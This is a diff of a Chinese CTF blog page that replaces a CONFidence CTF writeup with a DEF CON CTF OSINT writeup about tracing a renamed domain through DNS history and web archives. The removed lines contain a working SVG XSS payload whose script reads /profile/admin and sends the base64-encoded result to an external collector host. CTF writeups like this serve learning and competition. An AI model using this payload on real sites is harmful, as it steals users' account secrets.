@@ -22,7 +22,7 @@
     <meta name="description" content="还在路上">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>CONFidence CTF的一道题 · Xi4or0uji</title>
+    <title>defcon ctf 学习 · Xi4or0uji</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Xi4or0uji&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">CONFidence CTF的一道题</a>
+                <a href="#" class="post-name">defcon ctf 学习</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            CONFidence CTF的一道题
+            defcon ctf 学习
             <!-- 404 -->
             
         </h1>
@@ -272,12 +272,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">434</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">346</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/04/25</span>
+                    <span class="post-intro-time">2019/05/19</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,11 +401,10 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>这道题是之前在看先知的文章看到了，看了一下发现有点有趣，记录一下  </p>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>地址：<a href="http://web50.zajebistyc.tf/" target="_blank" rel="noopener">http://web50.zajebistyc.tf/</a><br>预期解是svg xss，非预期是缓存投毒<br>首先我们先看一下题目，进去是登录框，随便乱填就可以进去<br><img src="/assets/svg/1.png" alt=""><br>进去以后有一个头像上传的地方和<code>secret</code>的值，猜测应该是拿到管理员的<code>secret</code>值，然后利用点应该就是头像上传的地方了  </p>
-<h4 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h4><p>在测试的过程中发现可以上传任意后缀的文件，但是文件头必须是图片格式且尺寸只能是100*100，而且上传html文件时发现服务器会将文件当做图片解析，因此后台应该是根据文件头去进行解析的，所以我们可以找一个可以进行xss的图片，也就是svg<br>原理参考： <a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a><br>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> response;</span></span><br><span class="line"><span class="actionscript">    xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (<span class="number">4</span> == xmlhttp.readyState) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (<span class="number">200</span> == xmlhttp.status) &#123;</span></span><br><span class="line"><span class="actionscript">                location.href=<span class="string">'http://onsdtb.ceye.io?'</span>+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="actionscript">    xmlhttp.open(<span class="string">"GET"</span>, <span class="string">"/profile/admin"</span>);</span></span><br><span class="line"><span class="undefined">    xmlhttp.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h4><p>这里贴一波国外的师傅的writeup：<a href="https://ctftime.org/writeup/13925" target="_blank" rel="noopener">https://ctftime.org/writeup/13925</a><br>因为这个考点触及到我的知识盲区了，肉鸡决定研究一下  </p>
-<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4>
+        <p>菜鸡web手这场比赛全程挂机……web是真的越来越难打了  </p>
+<h4 id="cant-even-unplug-it"><a href="#cant-even-unplug-it" class="headerlink" title="cant_even_unplug_it"></a>cant_even_unplug_it</h4><p>一题脑洞了2333<br>题目+hint放一放<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You know, we had this up and everything. Prepped nice HTML5, started deploying on a military-grade-secrets.dev subdomain, got the certificate, the whole shabang. Boss-man got moody and wanted another name, we set up the new names and all. Finally he got scared and unplugged the server. Can you believe it? Unplugged. Like that can keep it secret…</span><br><span class="line"></span><br><span class="line">Hint: these are HTTPS sites. Who is publicly and transparently logging the info you need?</span><br><span class="line"></span><br><span class="line">Just in case: all info is freely accessible, no subscriptions are necessary. The names cannot really be guessed.</span><br></pre></td></tr></table></figure></p>
+<p>一开始看到这道题目懵逼了，怎么没有网站？？？经过菜鸡谷歌+半懵半猜终于读懂了题目（wtcl<br>他们在military-grade-secrets.dev这个子域建了一个网站，但是他们改变了网站名，所以我们首先要将原来的网站名找出来<br>首先所有的域名和名称更改都通过DNS进行追踪，用<a href="https://securitytrails.com/dns-trails" target="_blank" rel="noopener">https://securitytrails.com/dns-trails</a> 去查看同一个子域下的其他域名，可以看到这个<br><img src="/assets/2019def/1.png" alt=""><br>访问一下secret-storage.military-grade-secrets.dev发现会自动跳转去forget-me-not.even-more-militarygrade.pw这个网站<br><img src="/assets/2019def/2.png" alt=""><br>现在我们再看一下forget-me-not.even-more-militarygrade.pw这个网站，可以看到这里有个DigitalOcean<br><img src="/assets/2019def/3.png" alt=""><br>所以这个网站曾经在Digital Ocean上托管过，接着再去<a href="https://archive.org/web/" target="_blank" rel="noopener">https://archive.org/web/</a> 去找网站的快照就会找到4月27日有一个<br><img src="/assets/2019def/4.png" alt=""></p>
+
     </article>
     <!-- license  -->
     
@@ -413,17 +412,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/05/07/反射/" title="反射">
-                    <div class="nextTitle">反射</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/04/22/2019-全国大学生信息安全竞赛-writeup/" title="2019 全国大学生信息安全竞赛 writeup">
-                    <div class="prevTitle">2019 全国大学生信息安全竞赛 writeup</div>
+                <a href="/2019/05/15/open_basedir-bypass/" title="open_basedir bypass">
+                    <div class="prevTitle">open_basedir bypass</div>
                 </a>
             
         </li>
@@ -535,7 +529,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SVG-XSS"><span class="toc-number">2.</span> <span class="toc-text">SVG XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#缓存投毒"><span class="toc-number">3.</span> <span class="toc-text">缓存投毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#cant-even-unplug-it"><span class="toc-number">1.</span> <span class="toc-text">cant_even_unplug_it</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
